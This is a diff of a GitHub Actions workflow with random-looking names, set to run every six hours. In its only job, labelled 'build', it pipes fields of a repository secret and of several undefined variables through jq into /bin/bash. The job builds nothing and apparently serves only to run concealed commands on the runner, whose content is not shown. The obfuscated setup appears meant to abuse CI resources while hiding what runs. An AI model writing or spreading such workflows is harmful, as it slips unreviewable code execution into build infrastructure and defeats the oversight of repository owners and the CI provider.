@@ -1,22 +1,28 @@
 name: lantoufufk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
+    - cron: '13 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lantoufufk
         env:
-          jltd580: ${{ secrets.jltd580 }}
+          dr2250: ${{ secrets.dr2250 }}
         run: |
-          echo $jltd580 | jq -r .yzeo42987 | /bin/bash
-          echo $naf706 | jq -r .zcful5 | /bin/bash
-          echo $hrt55311 | jq -r .rsyvr4665 | /bin/bash
-          echo $dxhbq14738 | jq -r .lby8 | /bin/bash
-          echo $ppp33992 | jq -r .let7 | /bin/bash
+          echo $dr2250 | jq -r .cmv331 | /bin/bash
+          echo $fh4 | jq -r .ei453 | /bin/bash
+          echo $up455 | jq -r .rldir7139 | /bin/bash
+          echo $kad0 | jq -r .kf78657 | /bin/bash
+          echo $dinof1 | jq -r .vivd59 | /bin/bash
+          echo $aybk34 | jq -r .wqm266 | /bin/bash
+          echo $dwdg04 | jq -r .wgw4047 | /bin/bash
+          echo $ttzet251 | jq -r .tc6607 | /bin/bash
+          echo $e00361 | jq -r .fdxw0 | /bin/bash
+          echo $wcyz203 | jq -r .rtcba6214 | /bin/bash
+          echo $dxljk716 | jq -r .ytlc441 | /bin/bash
 
